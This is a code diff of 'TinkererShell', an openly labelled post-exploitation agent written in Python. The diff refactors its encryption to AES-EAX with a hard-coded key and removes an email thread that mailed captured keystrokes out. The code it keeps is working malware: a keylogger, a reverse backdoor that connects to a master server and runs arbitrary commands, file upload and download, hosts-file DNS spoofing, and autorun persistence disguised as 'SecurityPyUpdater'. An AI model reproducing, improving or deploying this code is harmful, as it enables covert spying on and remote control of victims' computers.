@@ -3,38 +3,34 @@
 """TinkererShell bot, a simple agent for post exploitation.\n"""
 
 # Written By Ananke: https://github.com/4n4nk3
-import base64
+import json
 import os
+import shutil
 import socket
 import subprocess
 import sys
 import tempfile
 import threading
 import time
-import shutil
+from base64 import b64encode, b64decode
 from filecmp import cmp
-from tendo import singleton
 from pathlib import Path
-# pycrypto
+
+# pycryptodome
 from Crypto.Cipher import AES
-# mailer
-import smtplib
-from email.mime.text import MIMEText
+# tendo
+from tendo import singleton
 
 # Importing module for autostart written by Jonas Wagner
 # http://29a.ch/2009/3/17/autostart-autorun-with-python
 import autorun
 
-# Activating mailsender (True)
-mailactivation = False
 # Activating persistence (True)
 persistenceactivation = False
 
 # Global variables
-global platform
 global thr_block
 global thr_exit
-global username
 
 # I understand on which system I am and then I import the corrects modules for the keylogger
 if os.name == 'nt':
@@ -76,7 +72,8 @@ def persistence_install() -> bool:
         else:
             # Give executable permission to file
             try:
-                subprocess.Popen('chmod 700 ' + target_to_autostart, shell=True, stdout=subprocess.PIPE,
+                subprocess.Popen('chmod 700 ' + target_to_autostart, shell=True,
+                                 stdout=subprocess.PIPE,
                                  stderr=subprocess.PIPE,
                                  stdin=subprocess.PIPE)
             except Exception as exception:
@@ -84,8 +81,7 @@ def persistence_install() -> bool:
                 return False
         autorun.add('SecurityPyUpdater', target_to_autostart)
         return True
-    else:
-        return False
+    return False
 
 
 def persistence_remove() -> bool:
@@ -93,16 +89,14 @@ def persistence_remove() -> bool:
     if autorun.exists('SecurityPyUpdater'):
         autorun.remove('SecurityPyUpdater')
         return True
-    else:
-        return False
+    return False
 
 
 def persistence_status() -> bool:
     """Check if persistence is installed.\n"""
     if autorun.exists('SecurityPyUpdater'):
         return True
-    else:
-        return False
+    return False
 
 
 # Persistence !!!
@@ -115,27 +109,27 @@ me = singleton.SingleInstance()
 
 def receiver() -> str:
     """Receive data from master, decrypt it and return it.\n"""
-    lengthcrypt = s.recv(1024)
-    expected_length = int(DecodeAES(cipher, lengthcrypt))
+    lengthcrypt = s.recv(1024).decode('utf-8')
+    expected_length = int(decode_aes(lengthcrypt))
     encrypted_received_data = ''
     while len(encrypted_received_data) < expected_length:
         encrypted_received_data += s.recv(1024).decode('utf-8')
-    return DecodeAES(cipher, encrypted_received_data)
+    return decode_aes(encrypted_received_data)
 
 
 def sender(data_to_send: str) -> None:
     """Encrypt data and send it to master.\n"""
     # If data = 0 I will set an arbitrary string so sending operation will not be NULL
-    if len(data_to_send) == 0:
+    if not data_to_send:
         data_to_send = 'Ok (no output)\n'
     # Crypting data, obtaining their length and then typecasting it to data_to_send string and crypting it
-    encoded = EncodeAES(cipher, data_to_send)
+    encoded = encode_aes(data_to_send)
     length = str(len(encoded))
-    length_crypt = EncodeAES(cipher, length)
+    length_crypt = encode_aes(length)
     # Sending the length and wait. Then send data
-    s.send(length_crypt)
+    s.send(bytes(length_crypt, 'utf-8'))
     time.sleep(1)
-    s.send(encoded)
+    s.send(bytes(encoded, 'utf-8'))
 
 
 def command_executor(command: str):
@@ -238,17 +232,17 @@ def keylogs_stop():
         sender('Keylogger is not running!\n')
 
 
-def keylogs_download(keylogfile_dow: str):
+def keylogs_download():
     """Send keylogged data to the master and delete it from victim host.\n"""
     try:
-        with open(keylogfile_dow, 'rb') as f_kd:
-            keylogged_data = base64.b64decode(f_kd.read()).decode('utf-8')
+        with open(keylogfile, 'rb') as f_kd:
+            keylogged_data = b64decode(f_kd.read()).decode('utf-8')
         sender(keylogged_data + '\n')
     except Exception as exception:
         sender('reachedexcept')
         sender(str(exception))
     try:
-        cleaner = open(keylogfile_dow, 'w')
+        cleaner = open(keylogfile, 'w')
         cleaner.write('')
         cleaner.close()
     except Exception as exception:
@@ -267,7 +261,7 @@ def downloader():
     except Exception as exception:
         sender('reachedexcept')
         a = str(exception)
-    sender(a)
+    sender(a.decode('utf-8'))
 
 
 def uploader():
@@ -275,25 +269,48 @@ def uploader():
     filename = os.path.normcase(receiver())
     uploaded_data: str = receiver()
     if uploaded_data != 'reachedexcept':
-        if os.access(filename, os.W_OK):
-            try:
-                # Writing file in binary form
-                filewrite = open(filename, 'wb')
-                filewrite.write(bytes(uploaded_data))
-                filewrite.close()
-                sender('File saved in ' + filename + '\n')
-            except Exception as exception:
-                sender(str(exception))
-        else:
-            sender('Operation aborted! Cannot write to target file!\n')
+        try:
+            # Writing file in binary form
+            filewrite = open(filename, 'wb')
+            filewrite.write(bytes(uploaded_data, 'utf-8'))
+            filewrite.close()
+            sender('File saved in ' + filename + '\n')
+        except Exception as exception:
+            sender(str(exception))
     else:
         sender('Operation aborted\n')
+
+
+def encode_aes(text_input: str) -> str:
+    """Encode a string and output an json in string form.\n"""
+    secret = b'4n4nk353hlli5w311d0n3andI1ik3it!'
+    cipher = AES.new(secret, AES.MODE_EAX)
+    ciphertext, tag = cipher.encrypt_and_digest(bytes(text_input, 'utf-8'))
+    lista = [ciphertext, tag, cipher.nonce]
+    json_k = ['ciphertext', 'tag', 'nonce']
+    json_v = [b64encode(x).decode('utf-8') for x in lista]
+    return json.dumps(dict(zip(json_k, json_v)))
+
+
+def decode_aes(json_input: str) -> str:
+    """Decode a string in json form and output a string.\n"""
+    try:
+        b64 = json.loads(json_input)
+        json_k = ['ciphertext', 'tag', 'nonce']
+        jv = {k: b64decode(b64[k]) for k in json_k}
+        secret = b'4n4nk353hlli5w311d0n3andI1ik3it!'
+        cipher = AES.new(secret, AES.MODE_EAX, nonce=jv['nonce'])
+        cleared = (cipher.decrypt_and_verify(jv['ciphertext'], jv['tag'])).decode('utf-8')
+        return cleared
+    except Exception as exception:
+        print(exception)
+        print("Incorrect decryption")
 
 
 # =================================================================================================
 
 # Defining correct keylogging procedure
-def keylogger(fd_temp_key: int, keylogfile_key: str):
+def keylogger(fd_temp_key: int):
     """Key logger thread.\n"""
 
     def OnKeyboardEvent(event):
@@ -301,33 +318,33 @@ def keylogger(fd_temp_key: int, keylogfile_key: str):
         if not thr_block.isSet():
             if event.Ascii != 0 or 8:
                 # Use base64 and not an encryption just for performance
-                with open(keylogfile_key, 'r+b') as f_key:
-                    data_decoded = base64.b64decode(f_key.read()).decode('utf-8')
+                with open(keylogfile, 'r+b') as f_key:
+                    data_decoded = b64decode(f_key.read()).decode('utf-8')
                     f_key.seek(0)
                     if event.Key == 'space':
                         data_decoded += ' '
-                        f_key.write(base64.b64encode(data_decoded.encode('utf-8')))
+                        f_key.write(b64encode(data_decoded.encode('utf-8')))
                     elif event.Key == 'BackSpace':
                         data_decoded += '[BackSpace]'
-                        f_key.write(base64.b64encode(data_decoded.encode('utf-8')))
+                        f_key.write(b64encode(data_decoded.encode('utf-8')))
                     elif event.Key == 'Return':
                         data_decoded += '[Enter]'
-                        f_key.write(base64.b64encode(data_decoded.encode('utf-8')))
+                        f_key.write(b64encode(data_decoded.encode('utf-8')))
                     elif event.Key == 'Shift_L':
                         data_decoded += '[Shift_L]'
-                        f_key.write(base64.b64encode(data_decoded.encode('utf-8')))
+                        f_key.write(b64encode(data_decoded.encode('utf-8')))
                     elif event.Key == 'Shift_R':
                         data_decoded += '[Shift_R]'
-                        f_key.write(base64.b64encode(data_decoded.encode('utf-8')))
+                        f_key.write(b64encode(data_decoded.encode('utf-8')))
                     elif event.Key == 'Tab':
                         data_decoded += '[Tab]'
-                        f_key.write(base64.b64encode(data_decoded.encode('utf-8')))
+                        f_key.write(b64encode(data_decoded.encode('utf-8')))
                     else:
                         data_decoded += event.Key
-                        f_key.write(base64.b64encode(data_decoded.encode('utf-8')))
+                        f_key.write(b64encode(data_decoded.encode('utf-8')))
         if thr_exit.isSet():
             os.close(fd_temp_key)
-            sys.exit(0)
+            hm.cancel()
         return True
 
     # create a hook manager
@@ -348,103 +365,73 @@ def keylogger(fd_temp_key: int, keylogfile_key: str):
 
 # =================================================================================================
 
-def mailsender(keylogfile_mail: str):
-    """Thread to send keylogged data via email every 5 minutes (300 seconds).\n"""
-    user_name = 'name'
-    password = 'password'
-
-    sender_email = 'sender@yahoo.it'
-    receiver_email = 'reciver@yahoo.it'
-
-    while 1:
-        time.sleep(300)
-        if not thr_block.isSet():
-            try:
-                fo = open(keylogfile_mail, 'r')
-                msg = MIMEText(fo.read())
-                fo.close()
-                msg['Subject'] = 'Logged keystrokes'
-                msg['From'] = sender_email
-                msg['To'] = receiver_email
-            except Exception as exception:
-                print(exception)
-            try:
-                mail_socket = smtplib.SMTP_SSL('smtp.mail.yahoo.com:465')
-                mail_socket.login(user_name, password)
-                # noinspection PyUnboundLocalVariable
-                mail_socket.sendmail(sender_email, [receiver_email], msg.as_string())
-                mail_socket.close()
-                print('Successfully sent email')
-            except Exception as exception:
-                print(exception)
-
-
-# =================================================================================================
-
-def backdoor(mailactivation_bd: bool, keylogfile_bd: str):
+def backdoor():
     """Shell thread that connect to master and permit control over the agent.\n"""
-    host = '127.0.0.1'  # Remote host to which you want the backdoor to connect to
-    port = 4444  # The connection port to use
+    while True:
+        host = '127.0.0.1'  # Remote host to which you want the backdoor to connect to
+        port = 4444  # The connection port to use
 
-    # Defining global the variables that I need to use in many different functions
-    global s
-    global cipher
-    global EncodeAES
-    global DecodeAES
-    global username
+        # Defining global the variables that I need to use in many different functions
+        global s
 
-    # Creating the socket
-    first_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        # Creating the socket
+        first_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-    if platform == 'windows':
-        dnsfile = os.getenv('WINDIR') + os.path.normcase('/system32/drivers/etc/hosts')
-        dnsbackup = tempfile.gettempdir() + os.path.normcase('/spoofbackup')
-    else:
-        dnsfile = '/etc/hosts'
-        dnsbackup = tempfile.gettempdir() + '/spoofbackup'
+        if platform == 'windows':
+            dnsfile = os.getenv('WINDIR') + os.path.normcase('/system32/drivers/etc/hosts')
+            dnsbackup = tempfile.gettempdir() + os.path.normcase('/spoofbackup')
+        else:
+            dnsfile = '/etc/hosts'
+            dnsbackup = tempfile.gettempdir() + '/spoofbackup'
 
-    # Backing up Hosts file
-    f_bd = open(dnsfile, 'r')
-    buffer = f_bd.read()
-    f_bd.close()
-    f_bd = open(dnsbackup, 'w')
-    f_bd.write(buffer)
-    f_bd.close()
+        # Backing up Hosts file
+        f_bd = open(dnsfile, 'r')
+        buffer = f_bd.read()
+        f_bd.close()
+        f_bd = open(dnsbackup, 'w')
+        f_bd.write(buffer)
+        f_bd.close()
 
-    # Setting parameters required for crypting communications
-    block_size = 32
-    padding = '{'
-    pad = lambda y: y + (block_size - len(y) % block_size) * padding
-    EncodeAES = lambda c, y: base64.b64encode(c.encrypt(pad(y)))
-    DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).decode('utf-8').rstrip(padding)
-    # Setting password for crypting packets
-    secret = '4n4nk353hlli5w311d0n3andI1ik3it!'
-    cipher = AES.new(secret)
-    del secret
-
-    # Connection loop
-    while 1:
-        try:
-            # Connecting to the client
-            first_s.connect((host, port))
+        # Connection loop
+        while True:
+            while True:
+                if thr_exit.isSet():
+                    break
+                try:
+                    # Connecting to the client
+                    first_s.connect((host, port))
+                    break
+                    # If i cannot connect I wait 2 minutes and then I retry
+                except Exception as exception:
+                    print(exception)
+                    print('>>> New attempt in 2 min')
+                    time.sleep(30)
+                    print('>>> New attempt in 1,5 min')
+                    time.sleep(30)
+                    print('>>> New attempt in 1 min')
+                    time.sleep(30)
+                    print('>>> New attempt in 30 sec')
+                    time.sleep(30)
+            if thr_exit.isSet():
+                break
             # Sending information relatives to the infected system
             proc = subprocess.run(['whoami'], check=True, stdout=subprocess.PIPE, universal_newlines=True)
             username = proc.stdout.split()[0]
             # First time i send username
-            encoded = EncodeAES(cipher, username)
+            encoded = encode_aes(username)
             length = str(len(encoded))
-            length_crypt = EncodeAES(cipher, length)
+            length_crypt = encode_aes(length)
             # Sending the length and wait. Then send data
-            first_s.send(length_crypt)
+            first_s.send(bytes(length_crypt, 'utf-8'))
             time.sleep(1)
-            first_s.send(encoded)
+            first_s.send(bytes(encoded, 'utf-8'))
             print('Connection successful')
-            lengthcrypt = first_s.recv(1024)
-            expected_length = int(DecodeAES(cipher, lengthcrypt))
+            lengthcrypt = first_s.recv(1024).decode('utf-8')
+            expected_length = int(str(decode_aes(lengthcrypt)))
             encrypted_received_data = ''
             while len(encrypted_received_data) < expected_length:
                 encrypted_received_data += first_s.recv(1024).decode('utf-8')
-            new_port = int(DecodeAES(cipher, encrypted_received_data))
+            new_port = int(decode_aes(encrypted_received_data))
             print('New port is gonna be {}'.format(new_port))
             time.sleep(5)
             first_s.close()
@@ -452,87 +439,82 @@ def backdoor(mailactivation_bd: bool, keylogfile_bd: str):
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((host, new_port))
             # Sending information relatives to the infected system
-            encoded = EncodeAES(cipher, username)
+            encoded = encode_aes(username)
             length = str(len(encoded))
-            length_crypt = EncodeAES(cipher, length)
+            length_crypt = encode_aes(length)
             # Sending the length and wait. Then send data
-            s.send(length_crypt)
+            s.send(bytes(length_crypt, 'utf-8'))
             time.sleep(1)
-            s.send(encoded)
+            s.send(bytes(encoded, 'utf-8'))
             break
-        # If i cannot connect I wait 2 minutes and then I retry
+
+        # Commands loop
+        if not thr_exit.isSet():
+            while 1:
+                received_command = receiver()
+                if received_command != 'KeepAlive':
+                    if received_command == 'SHquit':
+                        sender('mistochiudendo')
+                        break
+                    elif received_command == 'SHkill':
+                        sender('mistochiudendo')
+                        # If thr_exit.set() next keystroke will terminate keylogger thread
+                        thr_exit.set()
+                        break
+                    elif received_command == 'SHprocesslist':
+                        listprocesses()
+                    elif received_command == 'SHprocesskill':
+                        killprocesses()
+                    elif received_command == 'SHdnsstart':
+                        dnsspoofer(dnsfile)
+                    elif received_command == 'SHdnsstop':
+                        if cmp(dnsfile, dnsbackup) is False:
+                            dnscleaner(dnsfile, dnsbackup, send=True)
+                        else:
+                            sender('Original hosts file and current one are the same! Nothing to change.')
+                    elif received_command == 'SHdownload':
+                        downloader()
+                    elif received_command == 'SHupload':
+                        uploader()
+                    elif received_command == 'SHkeylogstatus':
+                        keylogs_status()
+                    elif received_command == 'SHkeylogstart':
+                        keylogs_start()
+                    elif received_command == 'SHkeylogstop':
+                        keylogs_stop()
+                    elif received_command == 'SHkeylogdownload':
+                        keylogs_download()
+                    elif received_command == 'SHpersistenceenable':
+                        if persistence_install():
+                            sender('Persistence installation successful!')
+                        else:
+                            sender('Persistence already installed!')
+                    elif received_command == 'SHpersistencedisable':
+                        if persistence_remove():
+                            sender('Persistence remove successful!')
+                        else:
+                            sender('Persistence not yet installed!')
+                    elif received_command == 'SHpersistencestatus':
+                        if persistence_status():
+                            sender('Persistence is installed.')
+                        else:
+                            sender('Persistence is not installed.')
+                    else:
+                        command_executor(received_command)
+
+        # Recreating original hosts file of the system
+        if cmp(dnsfile, dnsbackup) is False:
+            dnscleaner(dnsfile, dnsbackup)
+        try:
+            os.remove(dnsbackup)
         except Exception as exception:
             print(exception)
-            print('>>> New attempt in 2 min')
-            time.sleep(30)
-            print('>>> New attempt in 1,5 min')
-            time.sleep(30)
-            print('>>> New attempt in 1 min')
-            time.sleep(30)
-            print('>>> New attempt in 30 sec')
-            time.sleep(30)
-
-    # Commands loop
-    while 1:
-        received_command = receiver()
-        if received_command != 'KeepAlive':
-            if received_command == 'SHquit':
-                sender('mistochiudendo')
-                break
-            elif received_command == 'SHprocesslist':
-                listprocesses()
-            elif received_command == 'SHprocesskill':
-                killprocesses()
-            elif received_command == 'SHdnsstart':
-                dnsspoofer(dnsfile)
-            elif received_command == 'SHdnsstop':
-                if cmp(dnsfile, dnsbackup) is False:
-                    dnscleaner(dnsfile, dnsbackup, send=True)
-                else:
-                    sender('Original hosts file and current one are the same! Nothing to change.')
-            elif received_command == 'SHdownload':
-                downloader()
-            elif received_command == 'SHupload':
-                uploader()
-            elif received_command == 'SHkeylogstatus':
-                keylogs_status()
-            elif received_command == 'SHkeylogstart':
-                keylogs_start()
-            elif received_command == 'SHkeylogstop':
-                keylogs_stop()
-            elif received_command == 'SHkeylogdownload':
-                keylogs_download(keylogfile_bd)
-            elif received_command == 'SHpersistenceenable':
-                if persistence_install():
-                    sender('Persistence installation successful!')
-                else:
-                    sender('Persistence already installed!')
-            elif received_command == 'SHpersistencedisable':
-                if persistence_remove():
-                    sender('Persistence remove successful!')
-                else:
-                    sender('Persistence not yet installed!')
-            elif received_command == 'SHpersistencestatus':
-                if persistence_status():
-                    sender('Persistence is installed.')
-                else:
-                    sender('Persistence is not installed.')
-            else:
-                command_executor(received_command)
-
-    # Recreating original hosts file of the system
-    if cmp(dnsfile, dnsbackup) is False:
-        dnscleaner(dnsfile, dnsbackup)
-    try:
-        os.remove(dnsbackup)
-    except Exception as exception:
-        print(exception)
-    # Closing socket
-    s.close()
-    print('Connection closed')
-    # If thr_exit.set() next keystroke will terminate keylogger thread
-    if mailactivation_bd is False:
-        thr_exit.set()
+        # Closing socket
+        s.close()
+        print('Connection closed')
+        if thr_exit.isSet():
+            break
+        time.sleep(120)
     return True
 
 
@@ -540,15 +522,12 @@ thr_block = threading.Event()
 thr_exit = threading.Event()
 
 # Keylogger's thread
-thread1 = threading.Thread(name='sic1', target=keylogger, args=(fd_temp, keylogfile)).start()
+thread1 = threading.Thread(name='sic1', target=keylogger, args=[fd_temp]).start()
 # Backdoor's thread
-thread2 = threading.Thread(name='sic2', target=backdoor, args=(mailactivation, keylogfile)).start()
-# If mailactivation is True I define the mailsender thread
-if mailactivation is True:
-    thread3 = threading.Thread(name='sic3', target=mailsender, args=keylogfile).start()
+thread2 = threading.Thread(name='sic2', target=backdoor).start()
 
+# TODO: Add function to kill a single bot
 # TODO: Split source in modules
-# TODO: Configure/Enable/Disable mail activation from shell cmd
 # TODO: Keylogger add clipboard (trigger on ctrl+c and ctrl+v)
 # TODO: Add active window recognition
 # TODO: Add screenshooter
